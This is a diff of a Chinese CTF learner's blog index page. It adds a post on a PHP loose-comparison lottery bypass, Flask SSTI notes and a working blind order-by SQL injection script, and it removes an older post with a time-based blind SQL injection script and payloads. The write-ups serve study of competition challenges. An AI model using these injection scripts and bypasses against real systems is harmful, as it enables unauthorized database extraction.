@@ -41,9 +41,9 @@
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>19</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>20</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
-      <a href="/tags"><div><strong>8</strong><br>标签</div></a>
+      <a href="/tags"><div><strong>9</strong><br>标签</div></a>
     </div>
     <ul class="blog-link">
      
@@ -68,6 +68,65 @@
 </div>
 
         <section id="main">
+  
+    <article id="post-近期比赛学习到的一些知识" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/07/22/近期比赛学习到的一些知识/" class="article-date">
+  <time class="post-time" datetime="2018-07-22T01:33:46.000Z" itemprop="datePublished">
+    <span class="post-month">7月</span><br/>
+    <span class="post-day">22</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/07/22/近期比赛学习到的一些知识/">近期比赛学习到的一些知识</a>
+    </h1>
+  
+
+        <div>
+          
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
+  </div>
+
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery"></a>Lottery</h2><p>这是QCTF的一道题目，算是比较有新意的一道题目(对我来说….)。<br><img src="../images/16/1.png" alt=""><br>题目要求很简单啊，大致意思就是让你买7个数字，中了大概一千万就能买到flag了。<br>一开始先扫一发目录，果然发现了有.git源码泄露。先把源码下下来吧。<br><img src="../images/16/2.png" alt=""><br>打开源码进行分析。<br>关于大致流程是这样的，首先要求我们登入，只需要输入一个用户名，网页自动生成一个账户，其实这里账户是什么都无所谓，根本不会写入数据库进行交互，无论哪个账户的初始金额都只有20美元，这里就有两个思路了。<br>我第一个想法就是看看在数据交互的时候能否更改我账户的金额，翻了翻源码发现这个不同一般网页，这个网页应用了Ajax技术，金额是在前端进行交互，没办法去抓包更改(可能是我技术太垃圾了)。所以思来想去，pass了这个思路。<br>第二个想法呢，是经过大师傅的指导才有的思路。这个题目既然说了买彩票，那么题目的做法一定和彩票有联系，不会无缘无故的设计一个博彩系统来迷惑我们，所以呢，我们需要搏一搏。<br>单纯的去买一堆彩票能中上千万是不现实的，所以肯定需要一些特殊的办法来发家致富。因此要关注这是如何验证彩票中奖情况的，所以重点锁定在了api.php里面的函数。<br><img src="../images/16/3.png" alt=""><br>这里可以看出彩票的数字生成是实实在在不可预测的，这个根据实时内存生成的函数基本无法预测。所以只有从如何比较的方向入手了。<br><img src="../images/16/4.png" alt=""><br>验证时分别获取我们输入的数字以及随机生成数字进行比较，本题关键就是在这，这里并没有用强类型比较，而是用了弱类型比较。在弱类型比较里面，非零数在与true比较时是返回true的，所以到这里思路就很明确了，只要在我们提交购买彩票时把我们数据改成7个true就行了，但是在做题目的时候发现了一个问题，json数据怎么改。经过post，用py发包无果后才发现，这用burp就可以了啊。。。。。。<br><img src="../images/16/5.png" alt=""><br>把数字改成true就行了，记得在读取数据的时候是以数组的形式，记得把numbers改为数组形式，要不然会以字符串形式读取字符，这就无法匹配了。<br><strong>PS:布尔型变量在很多验证都能起到绕过匹配的作用，多加以应用。</strong>  </p>
+<h2 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h2><h3 id="SSTI-模板注入"><a href="#SSTI-模板注入" class="headerlink" title="SSTI-模板注入"></a>SSTI-模板注入</h3><p>这也是根据一道题目所学来的知识点，虽然没有做出来，但是这里还是值得记录一下。题目解析就不写了，只是写写一些要点。<br>对于我来说，目前接触到了很多由于攻击者进行恶意输入导致网页信息泄露，被攻击者获取权限的注入手段。比如最常见的sql注入，xss，代码注入，以及命令注入等。SSTI–服务端模板注入还是第一次接触。<br>SSTI注入主要发生在用户请求的地方，这个和xss有点相似，网页把用户查询的信息未经过严格的处理直接回显到了页面，根据不同的服务端模板，如果我们调用模板中的函数，就能在特定情况下利用其读取文件或者写入shell等操作。<br>具体详细可以参考这一篇文章:<a href="http://www.freebuf.com/vuls/83999.html。" target="_blank" rel="noopener">http://www.freebuf.com/vuls/83999.html。</a>  </p>
+<h3 id="flask模板中request"><a href="#flask模板中request" class="headerlink" title="flask模板中request"></a>flask模板中request</h3><p>这道题目就是使用python的flask模板，在flask中前端需要发送不同的请求及各种带参数的方式，比如GET方法在URL后面带参数和POST在BODY带参数，有时候又是POST的表单提交方式，这个时候就需要从request提取参数。<br>下面是request可使用的属性，主要归纳一些常用的。<br><strong>form</strong>:一个从POST和PUT请求解析的 MultiDict（一键多值字典）。<br><strong>args</strong>:MultiDict，要操作 URL （如 ?key=value ）中提交的参数可以使用 args 属性:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.arg.key?key=value</span><br></pre></td></tr></table></figure></p>
+<p><strong>values</strong>:CombinedMultiDict，内容是form和args。可以使用values替代form和args。<br><strong>headers</strong>:请求头，字典类型。<br><strong>data</strong>:包含了请求的数据，并转换为字符串，除非是一个Flask无法处理的mimetype。<br><strong>method</strong>:请求方法，比如POST、GET。<br><strong>PS:在过滤了某些关键词时可以使用args属性绕过。</strong><br><strong>通过调用py类中函数对于的索引来读取或者写入文件</strong></p>
+<h2 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h2><p>只能说自己实力还是太弱了吧，碰到sql注入题目都要花很久才能做出来。这一次是一道关于order by注入的一道题目，题目提示了select flag from flag，只要爆破出字段就行了。<br>题目有提供id，name，price三个排序方式，对于mysql来说，排序方式转化为二进制，那么在使用id排序时，id=1对应的就是0001，id=2对于的就是0010，而假对应的是0000，也就是说不改变排序方式，而真对应的是0001，在与2位异或时，2变成了0011，3却变成了0001，所以这里我们可以使用位异或结合布尔型来更改排序方式。<br>贴下我的垃圾脚本吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">list = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_abcdefghijklmnopqrstuvwxyz0123456789&quot;</span><br><span class="line">r1 = &quot;&quot;</span><br><span class="line">text = &quot;&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,27):</span><br><span class="line">    for j in list:</span><br><span class="line">        url = &quot;http://101.71.29.5:10004/?order=id^(substr((select flag from flag),%d,1)=&apos;%s&apos;) &amp;button=submit&quot;%(i,j)</span><br><span class="line">        r1 = requests.get(url)</span><br><span class="line">        text = r1.content</span><br><span class="line">        if text[949] == &apos;3&apos;:</span><br><span class="line">            print j</span><br><span class="line">            flag = flag + j</span><br><span class="line">            break</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/07/22/近期比赛学习到的一些知识/" data-id="cjjz9twqz001mckvezva3fxp4" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
   
     <article id="post-一次靶场的注入实战" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -122,7 +181,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/15/一次靶场的注入实战/" data-id="cjjmmtect000xiwvehb953ll2" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/15/一次靶场的注入实战/" data-id="cjjz9twpn0012ckveide97004" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
@@ -189,7 +248,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/13/xss挑战赛的Payload-下/" data-id="cjjmmtecx000ziwven0ces6xj" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/13/xss挑战赛的Payload-下/" data-id="cjjz9twqt001kckvewp7aoxvw" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
@@ -259,7 +318,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/10/xss挑战赛的Payload(上)/" data-id="cjjmmted10011iwve19oqm5un" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/10/xss挑战赛的Payload(上)/" data-id="cjjz9twpy0018ckvecp4hx6wb" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
@@ -320,7 +379,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/06/01/关于xss的一些学习心得/" data-id="cjjmmteda0016iwved0v1gzm7" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/06/01/关于xss的一些学习心得/" data-id="cjjz9twqo001hckverdvlgmme" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-XSS/">Web XSS</a></li></ul>
@@ -405,7 +464,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/25/ISCC之Web的一些wp/" data-id="cjjmmteck000riwvewn52t4z0" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/25/ISCC之Web的一些wp/" data-id="cjjz9twnh000hckveezdx8hc8" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -464,7 +523,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/23/order by和group by在sql注入中的妙用/" data-id="cjjmmtebz000giwventjg9nnt" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/23/order by和group by在sql注入中的妙用/" data-id="cjjz9twn7000cckvee9z1um6a" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
@@ -621,7 +680,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/17/入侵后台的一次尝试/" data-id="cjjmmted60013iwve035a06w5" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/17/入侵后台的一次尝试/" data-id="cjjz9twps0014ckvet6zri1z1" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -684,7 +743,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/07/CBC字节反转攻击/" data-id="cjjmmtec9000kiwve86mxi6fi" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/07/CBC字节反转攻击/" data-id="cjjz9twmo000bckveoixbifnx" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -749,65 +808,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/01/sql注入之报错注入/" data-id="cjjmmtecn000tiwvebbkwwul3" class="article-share-link">分享</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-sql注入之时间盲注" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/04/30/sql注入之时间盲注/" class="article-date">
-  <time class="post-time" datetime="2018-04-30T08:37:07.000Z" itemprop="datePublished">
-    <span class="post-month">4月</span><br/>
-    <span class="post-day">30</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/30/sql注入之时间盲注/">sql注入之时间盲注</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>上一种注入方式是在虽然没有回显位，但是正确错误的页面有所不同的，那如果正确页面和错误页面都相同呢？我们这是可以使用<strong>第二种注入–延时注入</strong>来判断我们所要的信息。<br>主要用到的是<strong>sleep()函数</strong>如果前面的语句为真，那么sleep()就会调用，页面回显就会有延迟，不过缺点也很明显，如果网络不好的话，报错注入就会出现误报的情况。<br>一般我们使用</p>
-<blockquote>
-<p>if(,1,2)<br>case when() then else end   </p>
-</blockquote>
-<p>这两个条件语句来进行逻辑判断<br>下面这是一个例子<br><img src="../images/9/1.png" alt=""><br>这个网站现在什么都不显示，但是我们可以试试sleep()是否有用。<br><img src="../images/9/2.png" alt=""><br>发现响应时间过长，sleep函数起了作用，接下来我们就可以试着去爆破了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">database = &quot;&quot;</span><br><span class="line">for i in range(1,20):</span><br><span class="line">    stime = time.time()</span><br><span class="line">    url = &quot;http://47.94.13.75/edu/payload/sql/time.php?id=1&apos; and case when(select length(database()) = %d) then sleep(10) else sleep(0) end --+&quot; %(i)</span><br><span class="line">    r1 = requests.get(url)</span><br><span class="line">    if time.time() - stime &gt; 10:</span><br><span class="line">        length = i</span><br><span class="line">        break</span><br><span class="line">print length</span><br><span class="line">for i in range(1,length+1):</span><br><span class="line">    for j in range(65,123):</span><br><span class="line">        stime = time.time()</span><br><span class="line">        url2 = &quot;http://47.94.13.75/edu/payload/sql/time.php?id=1&apos; and case when((select ascii(substr(database(),%d,1)))= %d) then sleep(10) else sleep(0) end --+&quot;%(i,j)</span><br><span class="line">        r2 = requests.get(url2)</span><br><span class="line">        if time.time() - stime &gt; 10:</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            break</span><br><span class="line">            print database</span><br><span class="line">print database</span><br></pre></td></tr></table></figure></p>
-<p>爆破出数据库名。接下来的几个语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; and case when(ascii(substr((select table_name from information_schema.tables where table_schema=&quot;edutest&quot; limit 0,1),1,1)) = 65) then sleep(10) else sleep(0) end --+&quot;</span><br><span class="line">........</span><br></pre></td></tr></table></figure></p>
-<p>之后和上一次的脚本类似，理解一下自己就能去试试爆破出信息来了。</p>
-<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>无力感，什么都做不好，什么都比不过人家，没实力又太骄傲，我可真是个废物。浮躁浮躁，一天都不知道在干些什么，真是糟糕透了。重新学吧，起码要在大二前，拿出一点成绩。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/30/sql注入之时间盲注/" data-id="cjjmmtedi001biwveebcoq7ai" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/01/sql注入之报错注入/" data-id="cjjz9twph0010ckvemccmtbbv" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -865,9 +866,9 @@ while flag:
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>19</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>20</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
-      <a href="/tags"><div><strong>8</strong><br>标签</div></a>
+      <a href="/tags"><div><strong>9</strong><br>标签</div></a>
     </div>
 
 
